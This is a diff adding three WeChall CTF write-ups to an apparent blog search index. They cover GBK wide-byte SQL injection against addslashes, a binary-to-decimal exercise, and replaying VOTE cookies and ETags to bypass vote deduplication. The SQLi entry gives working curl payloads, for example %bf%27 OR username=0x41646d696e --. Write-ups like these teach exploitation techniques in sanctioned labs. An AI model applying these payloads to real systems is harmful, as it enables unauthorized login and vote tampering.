@@ -19074,4 +19074,123 @@ Can you see the solution?</p>
         <tag>stegano</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - Addslashes</title>
+    <url>/wp/WeChall/wechall-addslashes/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>MySQL/Exploit 类，难度 5.44，909 人解出。源码可见，使用
+<code>addslashes()</code> 对用户输入转义，但数据库连接字符集设为
+GBK。目标：以 admin 身份登录。密码字段会被 <code>md5()</code>
+处理，无法注入。</p>
+<h3 id="solution">Solution</h3>
+<p>经典宽字节注入（Wide Byte Injection）。</p>
+<p><code>addslashes()</code> 会在
+<code>'</code>、<code>"</code>、<code>\</code>、<code>NUL</code>
+前插入反斜杠 <code>\</code>（0x5c）。正常情况下这能防住简单的 SQL
+注入，但 GBK 编码下，<code>0x5c</code>
+是合法的多字节字符的第二字节。</p>
+<p>GBK 编码范围：首字节 <code>0x81-0xFE</code>，尾字节
+<code>0x40-0xFE</code>（不含 <code>0x7F</code>）。所以
+<code>0xBF 0x5C</code> 是一个合法的 GBK 字符「縗」。</p>
+<p>攻击流程：</p>
+<p>表单使用 GET 方法提交，按钮值为「注册」。先确认正常登录行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=test&amp;password=test&amp;login=login&#x27;</span><br><span class="line">You are logged in, but not as Admin.</span><br></pre></td></tr></table></figure>
+<p>直接注入单引号，被 <code>addslashes()</code> 拦截：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=admin%27--+-&amp;password=x&amp;login=login&#x27;</span><br><span class="line">Wrong username/password.</span><br></pre></td></tr></table></figure>
+<p>用 <code>%bf</code> 前缀构造宽字节。<code>admin'</code> 经过
+<code>addslashes()</code> 变成 <code>admin\'</code>，即
+<code>admin%5c%27</code>。我们在前面加 <code>%bf</code>，使
+<code>%bf%5c</code> 被 GBK
+解码为一个字符，<code>%27</code>（单引号）就逃逸了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=%bf%27+OR+1%3d1--+-&amp;password=x&amp;login=login&#x27;</span><br><span class="line">You are logged in, but not as Admin.</span><br></pre></td></tr></table></figure>
+<p><code>%bf%5c</code> 被 GBK 吃掉成为「縗」，后面的
+<code>' OR 1=1-- -</code> 被解释为 SQL，绕过了转义。但
+<code>OR 1=1</code> 只会返回表中第一条记录，不一定是 Admin。需要精确指定
+Admin 用户名，用 hex 编码避免单引号被转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -s -b &#x27;WC=...&#x27; \</span><br><span class="line">  &#x27;https://www.wechall.net/en/challenge/addslashes/index.php?username=%bf%27+OR+username%3d0x41646d696e+--+&amp;password=x&amp;login=login&#x27;</span><br><span class="line">You are logged in. congrats!</span><br></pre></td></tr></table></figure>
+<p><code>0x41646d696e</code> 是 <code>'Admin'</code> 的 hex
+编码，不包含单引号，不会被 <code>addslashes()</code> 干扰。</p>
+<p>核心原理图示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入:    &#x27; OR username=0x41646d696e -- -</span><br><span class="line">转义:    \&#x27; OR username=0x41646d696e -- -</span><br><span class="line">GBK 解: [縗]&#x27; OR username=0x41646d696e -- -    ← 反斜杠被吞，单引号逃逸</span><br><span class="line">SQL:     WHERE user=&#x27;[縗]&#x27; OR username=0x41646d696e -- -&#x27;</span><br><span class="line">         → 匹配 Admin 用户，密码条件被注释掉</span><br></pre></td></tr></table></figure>
+<p><code>OR 1=1</code>
+虽然能绕过密码检查，但只返回第一条记录。实际解题需要
+<code>OR username=0x41646d696e</code> 精确匹配 Admin。密码字段会被
+<code>md5()</code> 处理后再拼接，无法通过用户名注入绕过，所以必须用
+<code>--</code> 注释掉密码条件。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>encoding</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - CGX#3 - Binary Encoding</title>
+    <url>/wp/WeChall/wechall-cgx-03-binary-encoding/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>The page shows a random 8-bit binary string and asks for its decimal
+equivalent:</p>
+<blockquote>
+<p>Please convert this binary data to a decimal number. 01100101</p>
+</blockquote>
+<p>The number is randomly generated and bound to your session.</p>
+<h3 id="solution">Solution</h3>
+<p>Convert with Python or JavaScript:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">parseInt</span>(<span class="string">&#x27;01100101&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
+<p>Manual: each bit position is a power of 2, from right (2^0) to left
+(2^7). <code>01100101</code> = 64+32+4+1 = 101.</p>
+<p>Since the challenge is session-bound, you'll see a different number
+each visit — the method stays the same.</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>cgx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Tracks</title>
+    <url>/wp/WeChall/wechall-tracks/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>一个投票系统，需要投至少 2 次票。没有 IP 检查，但使用 HTTP
+缓存机制（ETag/VOTE cookie）防止重复投票。</p>
+<h3 id="solution">Solution</h3>
+<p>投票页面 <code>votes.php</code> 用 HTTP
+缓存头做投票去重——这不是缓存的典型用法，但原理相同:</p>
+<ol type="1">
+<li><strong>VOTE cookie</strong>: 服务器设置
+<code>VOTE=&lt;value&gt;</code> cookie 标记已投票</li>
+<li><strong>ETag / If-None-Match</strong>: 服务器返回 <code>ETag</code>
+头，浏览器后续请求带 <code>If-None-Match</code> 验证资源未变</li>
+</ol>
+<p>两层缺一不可: 没有 cookie 服务器不知道你投过票；没有 If-None-Match
+服务器认为是新的投票请求。</p>
+<p>第一次投票成功后，服务器返回 "Please press the vote button
+again"。关键在于第二次请求必须同时带上第一次响应的 VOTE cookie 和 ETag
+值。</p>
+<p>ETag 值带 <code>W/</code> 前缀表示 weak
+validator（语义等价即可，不要求字节一致），但 curl 传 If-None-Match
+时要带这个前缀。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一次投票 - 捕获 ETag 和 VOTE cookie</span></span><br><span class="line">$ curl -v -s -b <span class="string">&#x27;WC=...&#x27;</span> <span class="string">&#x27;https://www.wechall.net/en/challenge/tracks/votes.php?vote=3&#x27;</span> 2&gt;&amp;1 | grep -i <span class="string">&#x27;etag\|set-cookie&#x27;</span></span><br><span class="line"><span class="comment"># ETag: W/22661-0-VDFqOmu5pLs8JDjj</span></span><br><span class="line"><span class="comment"># Set-Cookie: VOTE=22661-0-VDFqOmu5pLs8JDjj</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次投票 - 带上 VOTE cookie 和 If-None-Match</span></span><br><span class="line">$ curl -s -b <span class="string">&#x27;WC=...; VOTE=22661-0-VDFqOmu5pLs8JDjj&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;If-None-Match: W/22661-0-VDFqOmu5pLs8JDjj&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/tracks/votes.php?vote=3&#x27;</span></span><br><span class="line"><span class="comment"># Vote registered!</span></span><br><span class="line"><span class="comment"># Your answer is correct</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>http</tag>
+      </tags>
+  </entry>
 </search>
